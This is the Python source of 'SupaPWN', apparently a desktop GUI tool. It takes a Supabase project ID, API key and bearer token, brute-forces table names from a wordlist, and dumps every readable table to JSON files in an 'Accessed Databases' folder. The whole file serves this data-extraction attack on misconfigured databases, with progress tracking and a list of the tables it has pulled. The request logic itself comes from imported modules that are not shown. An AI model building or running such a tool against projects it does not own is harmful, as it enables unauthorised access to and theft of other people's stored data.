import re
import os
import json
import requests
import pyperclip
import customtkinter as ctk

from Lib.lowlevel import LowLevel
from Lib.winutils import WinUtils
from Lib.images import ImageLoader
from Lib.messagebox import MessageBox
from Lib.supabase import Supabase
from Lib.wordlist import Wordlist

os.makedirs("./Accessed Databases")

try: LowLevel.LoadFontFromTTF("./Assets/Fonts/Horizon.ttf")
except: pass

try: LowLevel.LoadFontFromTTF("./Assets/Fonts/ArchivoBlack.ttf")
except: pass

ctk.set_appearance_mode('light')

class UIState:
    class TargetInfos:
        CurrentWorkspaceName: str = ""

    class Scanner:
        Scanning: bool = False

def UpdateDistDirPreview(e) -> None:
    previewFont = ctk.CTkFont(family="Arial", size=10)

    MAX_LABEL_WIDTH = 290  

    def CleanFolderName(name: str) -> str:
        return re.sub(r'[\\/:*?"<>|]', '', name).strip()

    def TruncateMiddle(text: str, font: ctk.CTkFont, maxWidth: int) -> str:
        if font.measure(text) <= maxWidth:
            return text

        ellipsis = "..."
        head = tail = len(text) // 2

        while head > 0 or tail > 0:
            candidate = text[:head] + ellipsis + text[len(text) - tail:]
            if font.measure(candidate) <= maxWidth:
                return candidate
            if head > tail:
                head -= 1
            else:
                tail -= 1

        return ellipsis
    path = f"./Accessed Databases/{CleanFolderName(workspaceNameEntry.get())}"
    distDirPreviewLabel.configure(text=TruncateMiddle(path, previewFont, MAX_LABEL_WIDTH))

import threading

def StartScan() -> None:
    def BlockWidgets() -> None:
        for widget in targetInfosFrame.winfo_children():
            if isinstance(widget, ctk.CTkFrame):
                for widget in widget.winfo_children(): 
                    try: widget.configure(state='disabled')
                    except: pass
                    
            try: widget.configure(state='disabled')
            except: pass

        scanBtn.configure(text="Checking...")

    def UnblockWidgets() -> None:
        for widget in targetInfosFrame.winfo_children():
            if isinstance(widget, ctk.CTkFrame):
                for widget in widget.winfo_children(): 
                    try: widget.configure(state='normal')
                    except: pass

            try: widget.configure(state='normal')
            except: pass

        scanBtn.configure(text="Launch scan", fg_color='#545454', command=StartScan)

    def OnInvalid() -> None:
        MessageBox.Show(mainWin, "Invalid datas", "The provided datas (Project ID or Api key or Bearer token) are invalid")
        UnblockWidgets()

    def OnError(e: Exception) -> None:
        MessageBox.Show(mainWin, "Invalid datas", "The provided datas (Project ID or Api key or Bearer token) are invalid. If you are sure that these datas en right, please check your internet connection.")
        UnblockWidgets()

    def OnValid() -> None:
        def StopScan() -> None:
            UIState.Scanner.Scanning = False

        def AddFoundDB(name: str, content: dict, workspace: str) -> None:
            def CopyUrl():
                url = f"https://{session.ProjectId}.supabase.com/rest/v1/{name}?select=*"

                pyperclip.copy(url)

                dbUrlValue.configure(text="Copied")
                dbUrlValue.after(1000, lambda: dbUrlValue.configure(text=url))

            os.makedirs(f"./Accessed Databases/{workspace}", exist_ok=True)

            with open(f"./Accessed Databases/{workspace}/{name}.json", "w", encoding='utf-8') as f:
                json.dump(content, f, indent=4)
            
            frame = ctk.CTkFrame(logsFrame, height=75, width=529.5, fg_color="#222222", corner_radius=5)
            frame.pack(padx=6.25, pady=6.25)

            onlineIcon = ctk.CTkFrame(frame, height=8, width=8, corner_radius=8, fg_color="#059600")
            onlineIcon.place(x=10, y=14)

            dbNameLabel = ctk.CTkLabel(frame, text=name, font=("Arial", 12), text_color="#ffffff", height=14)
            dbNameLabel.place(x=25, y=10)

            dbRowCountName = ctk.CTkLabel(frame, text="Rows extracted :", font=("Arial", 12, "bold"), text_color="#ffffff")
            dbRowCountName.place(x=12, y=25)

            dbRowCountValue = ctk.CTkLabel(frame, text=str(len(content)), font=("Arial", 12), text_color="#ffffff")
            dbRowCountValue.place(x=110, y=25)

            dbUrlName = ctk.CTkLabel(frame, text="Database URL :", font=("Arial", 12, "bold"), text_color="#ffffff")
            dbUrlName.place(x=12, y=45)

            dbUrlValue = ctk.CTkLabel(frame, text=f"https://{session.ProjectId}.supabase.com/rest/v1/{name}?select=*", font=("Arial", 12), text_color="#ffffff")
            dbUrlValue.place(x=105, y=45)

            dbUrlValue.bind("<Enter>", lambda e: dbUrlValue.configure(text_color="#2a1e97", font=("Arial", 12, "underline")))
            dbUrlValue.bind("<Leave>", lambda e: dbUrlValue.configure(text_color="#ffffff", font=("Arial", 12)))

            dbUrlValue.bind("<Button-1>", lambda e: CopyUrl())

        UIState.Scanner.Scanning = True

        session = requests.Session()
        session.ProjectId = projectId
        session.headers = {"ApiKey": apiKey, "Authorization": token}

        for db in logsFrame.winfo_children():
            try: db.destroy()
            except: pass

        i = 0

        scanBtn.configure(fg_color="#a00a0a", text="Stop", command=StopScan, state='normal')

        while UIState.Scanner.Scanning:
            if len(Wordlist.Content) - 1 < i:
                break

            name = Wordlist.Content[i]

            i += 1

            scanProgressTableValue.configure(text=name)
            scanProgressValue.configure(text=f"{i}/{len(Wordlist.Content)}")

            databaseContent = Supabase.TryExtractContent(session, name)

            if databaseContent is not None:
                if len(databaseContent) > 0:
                    print("Ez :", name)
                    AddFoundDB(name, databaseContent, workspaceName)
                else:
                    print("Flop :", name)
            else:
                print("Existe aps :", name)

        scanProgressTableValue.configure(text="--")
        scanProgressValue.configure(text=f"--")

        scanBtn.configure(command=StartScan)

        UnblockWidgets()

    def Worker() -> None:
        try:
            isValid = Supabase.IsValidConfig(projectId, apiKey, token)
        except Exception as e:
            mainWin.after(0, OnError, e)
            return

        mainWin.after(0, lambda: threading.Thread(target=OnValid, daemon=True).start() if isValid else OnInvalid)

    projectId = projectIdEntry.get().strip()
    workspaceName = workspaceNameEntry.get().strip()
    apiKey = publicApiKeyEntry.get().strip()
    token = bearerTokenEntry.get().strip()

    toProvide = [
        name for name, value in [
            ("Project ID", projectId),
            ("Workspace Name", workspaceName),
            ("Api Key", apiKey),
            ("Bearer Token", token),
        ] if not value
    ]

    if toProvide:
        missing = "    - " + "\n    - ".join(toProvide)
        MessageBox.Show(mainWin, "Missing data", f"Please fill the following fields :\n\n{missing}\n")
        return

    BlockWidgets()

    threading.Thread(target=Worker, daemon=True).start()
    
mainWin = ctk.CTk(fg_color="#1b1b1b")
mainWin.geometry("800x530")
mainWin.overrideredirect(True)
mainWin.attributes("-topmost", True)

main = ctk.CTkFrame(mainWin, height=500, width=800, fg_color="#171717", corner_radius=1)
main.place(x=0, y=30)

sidebar = ctk.CTkFrame(main, fg_color="#1b1b1b", corner_radius=5, height=400, width=175)
sidebar.place(x=12.5, y=87.5)

titleFrame = ctk.CTkLabel(main, height=62.5, width=175, fg_color="#1b1b1b", corner_radius=5)
titleFrame.place(x=12.5, y=12.5)

sidebarTitle = ctk.CTkLabel(titleFrame, text="SupaPWN", font=("Horizon", 18), height=20, text_color="#ffffff")
sidebarTitle.place(relx=0.5, rely=0.5, anchor='center')

sidebarScanProgressFrame = ctk.CTkFrame(sidebar, height=75, width=175, fg_color="#1b1b1b", corner_radius=5)
sidebarScanProgressFrame.place(x=0, y=25)

scanProgressTableName = ctk.CTkLabel(sidebarScanProgressFrame, text="Table :", font=("Arial", 13, "bold"), text_color="#ffffff")
scanProgressTableName.place(x=10, y=0)

scanProgressTableValue = ctk.CTkLabel(sidebarScanProgressFrame, text="--", font=("Arial", 13), height=13, text_color="#ffffff")
scanProgressTableValue.place(x=20, y=26)

scanProgressName = ctk.CTkLabel(sidebarScanProgressFrame, text="Progress :", font=("Arial", 13, "bold"), text_color="#ffffff")
scanProgressName.place(x=10, y=42)

scanProgressValue = ctk.CTkLabel(sidebarScanProgressFrame, text="--", font=("Arial", 13), text_color="#ffffff")
scanProgressValue.place(x=85, y=42)

sidebarImage = ctk.CTkLabel(sidebar, text="", image=ImageLoader.RenderCTkImage("./Assets/Img/hellcat.png", (125, 225)))
sidebarImage.place(x=0, y=150)

dashboard = ctk.CTkFrame(main, height=475, width=587.5, fg_color="#1b1b1b", corner_radius=5)
dashboard.place(x=200, y=12.5)

targetInfosFrame = ctk.CTkFrame(dashboard, height=200, width=562.5, fg_color="#1D1D1D", corner_radius=5)
targetInfosFrame.place(x=12.5, y=12.5)

logsFrame = ctk.CTkScrollableFrame(dashboard, height=225, width=542.5, fg_color="#1D1D1D", corner_radius=5)
logsFrame.place(x=12.5, y=225)

projectIdEntry = ctk.CTkEntry(targetInfosFrame, height=30, width=200, placeholder_text="Supabase ID", fg_color="#181818", corner_radius=5, border_width=0, text_color="#ffffff")
projectIdEntry.place(x=12.5, y=12.5)

workspaceNameFrame = ctk.CTkFrame(targetInfosFrame, height=50, width=325, fg_color="#1D1D1D", corner_radius=1)
workspaceNameFrame.place(x=225, y=12.5)

workspaceNameEntry = ctk.CTkEntry(workspaceNameFrame, height=30, width=325, fg_color="#181818", placeholder_text="Workspace Name", text_color="#ffffff", corner_radius=5, border_width=0)
workspaceNameEntry.place(x=0, y=0)

distDirPreviewLabel = ctk.CTkLabel(workspaceNameFrame, text="./Accessed Databases/", font=("Arial", 10), text_color="#ffffff", fg_color="#1D1D1D", height=12)
distDirPreviewLabel.place(relx=0.5, y=40, anchor='center')

workspaceNameEntry.bind("<KeyRelease>", UpdateDistDirPreview)

publicApiKeyEntry = ctk.CTkEntry(targetInfosFrame, text_color="#ffffff", height=30, width=537.5, fg_color="#181818", border_width=0, corner_radius=5, placeholder_text="Public API Key")
publicApiKeyEntry.place(x=12.5, y=75)

bearerTokenEntry = ctk.CTkEntry(targetInfosFrame, text_color="#ffffff", height=30, width=537.5, fg_color="#181818", border_width=0, corner_radius=5, placeholder_text="Bearer token")
bearerTokenEntry.place(x=12.5, y=115)

scanBtn = ctk.CTkButton(targetInfosFrame, command=StartScan, height=30, width=537.5, fg_color="#545454", hover_color="#812626", corner_radius=5, text="Launch scan", font=("Archivo Black", 14))
scanBtn.place(x=12.5, y=157.5)

mainWin.after(200, lambda: (WinUtils.CreateTitleBar(mainWin, "SupaPWN - V1.0", 2), LowLevel.RoundWinCorners(2, mainWin), WinUtils.CenterWin(mainWin)))
mainWin.mainloop()
